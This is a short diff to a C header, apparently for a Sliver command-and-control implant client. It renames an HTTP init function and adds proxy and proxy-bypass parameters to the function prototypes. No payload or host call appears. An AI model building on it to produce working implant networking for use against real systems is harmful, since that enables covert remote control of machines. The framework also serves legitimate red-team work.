@@ -163,9 +163,11 @@ typedef struct _MINISIGN_PUB_KEY {
 	BYTE PublicKey[32];
 } MINISIGN_PUB_KEY, * PMINISIGN_PUB_KEY;
 
-PHTTP_CLIENT HttpClientInit
+PHTTP_SESSION HttpSessionInit
 (
-	_In_ PURI pUri
+	_In_ PURI pUri,
+	_In_ LPWSTR lpProxy,
+	_In_ LPWSTR lpProxyBypass
 );
 
 HINTERNET SendRequest
@@ -303,4 +305,11 @@ BOOL HttpClose
 PSLIVER_SESSION_CLIENT SessionInit
 (
 	_In_ PGLOBAL_CONFIG pGlobalConfig
+);
+
+PHTTP_CLIENT HttpClientInit
+(
+	_In_ PURI pUri,
+	_In_ LPWSTR lpProxy,
+	_In_ LPWSTR lpProxyBypass
 );
